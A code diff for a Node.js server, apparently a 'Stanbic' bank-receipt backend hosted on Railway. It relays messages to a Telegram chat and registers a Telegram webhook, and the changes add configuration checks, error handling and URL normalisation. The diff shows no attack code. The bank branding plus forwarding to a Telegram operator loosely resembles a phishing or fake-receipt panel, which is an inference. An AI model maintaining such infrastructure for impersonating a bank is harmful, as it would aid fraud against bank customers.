@@ -10,7 +10,6 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID || '';
 const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-/* ✅ Telegram timeout — every Telegram call aborts after 8s */
 const TG_TIMEOUT_MS = parseInt(process.env.TELEGRAM_TIMEOUT_MS, 10) || 8000;
 function tgFetch(url, opts = {}) {
   const controller = new AbortController();
@@ -28,7 +27,7 @@ try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
 const IS_PERSISTENT = DATA_DIR === '/data';
 
 /* ═══════════════════════════════════════════════════════════════
-   CORS — explicit allowlist + guaranteed OPTIONS handler.
+   CORS
    ═══════════════════════════════════════════════════════════════ */
 const ALLOWED_ORIGINS = [
   'https://mobile-bank-receipt-production.up.railway.app',
@@ -118,13 +117,29 @@ async function tgSend(text, replyMarkup){
     disable_web_page_preview: true
   };
   if (replyMarkup) body.reply_markup = replyMarkup;
+
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    const msg = 'Telegram not configured (TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID missing)';
+    console.error('[tgSend]', msg);
+    return { ok:false, description: msg };
+  }
+
   try {
     const r = await tgFetch(`${TELEGRAM_API}/sendMessage`, {
       method:'POST',
       headers:{'Content-Type':'application/json'},
       body: JSON.stringify(body)
     });
-    return await r.json();
+    const txt = await r.text();
+    let parsed;
+    try { parsed = JSON.parse(txt); } catch(_) {
+      console.error('[tgSend] non-JSON response:', txt.slice(0, 200));
+      return { ok:false, description: 'Telegram non-JSON response: ' + txt.slice(0, 200) };
+    }
+    if (!parsed.ok) {
+      console.error('[tgSend] Telegram rejected:', parsed);
+    }
+    return parsed;
   } catch(e){
     const msg = e.name === 'AbortError' ? 'Telegram request timed out' : e.message;
     console.error('[tgSend]', msg);
@@ -182,12 +197,17 @@ function normalizeLang(v){
 }
 
 function resolvePublicUrl(){
-  return (
+  let url = (
     process.env.PUBLIC_URL ||
-    (process.env.RAILWAY_PUBLIC_DOMAIN ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}` : '') ||
-    (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '') ||
-    `http://localhost:${PORT}`
+    process.env.RAILWAY_PUBLIC_DOMAIN ||
+    process.env.RENDER_EXTERNAL_HOSTNAME ||
+    `localhost:${PORT}`
   ).replace(/\/+$/, '');
+
+  if (!/^https?:\/\//i.test(url)) {
+    url = 'https://' + url;
+  }
+  return url;
 }
 
 app.get('/', (_req, res) => {
@@ -667,10 +687,13 @@ app.use('/api', (req, res) => {
 });
 
 async function registerWebhook(){
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.warn('[webhook] skipped — Telegram not configured');
+    return;
+  }
   const publicUrl = resolvePublicUrl();
   const webhookUrl = `${publicUrl}/api/telegram-webhook`;
   console.log(`PUBLIC_URL = ${publicUrl}`);
-  console.log(`Telegram timeout: ${TG_TIMEOUT_MS}ms`);
   console.log(`Registering webhook: ${webhookUrl}`);
   try {
     const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
@@ -679,16 +702,25 @@ async function registerWebhook(){
   } catch (e) { console.error('setWebhook failed:', e.message); }
 }
 
-app.listen(PORT, async () => {
+const server = app.listen(PORT, '0.0.0.0', () => {
   console.log(`Stanbic backend running on port ${PORT}`);
   console.log(`Static HTML dir: ${__dirname}`);
   console.log(`Data directory: ${DATA_DIR} ${IS_PERSISTENT ? '✅ PERSISTENT' : '⚠️  TEMPORARY'}`);
   if (!IS_PERSISTENT) {
     console.warn('⚠️  No persistent disk — transaction data will be WIPED on restart.');
-    console.warn('⚠️  To fix: add a persistent disk mounted at /data, then set DATA_DIR=/data');
   }
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.warn('⚠️  TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing — webhook may fail');
+    console.warn('⚠️  TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing — Telegram will not work');
   }
-  await registerWebhook();
+
+  registerWebhook().catch(e => console.error('Webhook registration failed:', e.message));
+});
+
+server.on('error', (err) => {
+  console.error('Server error:', err);
+  process.exit(1);
+});
+
+process.on('unhandledRejection', (reason) => {
+  console.error('Unhandled rejection:', reason);
 });
